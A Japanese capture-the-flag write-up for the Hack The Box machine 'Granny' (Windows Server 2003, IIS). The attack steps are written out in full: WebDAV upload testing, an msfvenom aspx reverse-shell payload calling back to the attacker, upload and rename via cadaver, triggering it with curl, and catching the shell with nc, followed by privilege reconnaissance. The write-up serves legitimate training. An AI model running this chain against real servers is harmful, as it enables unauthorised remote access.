https://app.hackthebox.com/machines/Granny  
「Grandpa」マシンと同じくiisをrceして初期侵入できるが、このマシンは別の手段使用

## STEP 1
```sh
└─$ rustscan -a 10.129.95.234 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.234:80
10.129.95.234 -> [80]
```

## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Granny_01.png">  
webdavが動いているかテスト  
拡張子txtをアップロードできるためaspx形式のリバースシェルを拡張子txtでアップロード  
moveメソッドで拡張子aspxに変更・アクセスすればリバースシェルをとれるかも
```sh
└─$ davtest -url http://10.129.159.79 -cleanup 
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.159.79
********************************************************
NOTE    Random string for this session: FMT9PIdSEZflF9
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9
********************************************************
 Sending test files
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     txt     SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
PUT     pl      SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.pl
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.php
PUT     html    SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
PUT     cfm     SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.cfm
PUT     jhtml   SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jhtml
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jsp
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
********************************************************
 Cleaning up
DELETE          FAIL:   http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.pl
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.php
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.cfm
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jhtml
PUT File: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jsp
Executes: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
Executes: http://10.129.159.79/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
```
msfvenomでリバースシェルペイロード作成
```sh
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.23 LPORT=4444 -f aspx -o shell.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2720 bytes
Saved as: shell.txt
```
putメソッドでtxt形式アップロード、moveメソッドでaspx形式に変更
```sh
└─$ cadaver http://10.129.159.79
dav:/> put shell.txt shell.txt
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 2720 bytes succeeded.

dav:/> move shell.txt shell.aspx
Moving `/shell.txt' to `/shell.aspx': failed:
Could not parse response: XML parse error at line 1: Extra content at the end of the document

dav:/> ls
Listing collection `/': succeeded.
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
        shell.aspx                          2720  Aug 10  2025
```
aspxにアクセスし、実行
```sh
└─$ curl http://10.129.159.79/shell.aspx
```
リバースシェル取得！しかしユーザフラグにすらアクセスできず
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.159.79] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd C:\"Documents and Settings"\Lakis
cd C:\"Documents and Settings"\Lakis
Access is denied.
```


## STEP 3
```cmd
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 48 Minutes, 27 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 736 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,282 MB
Page File: In Use:         188 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
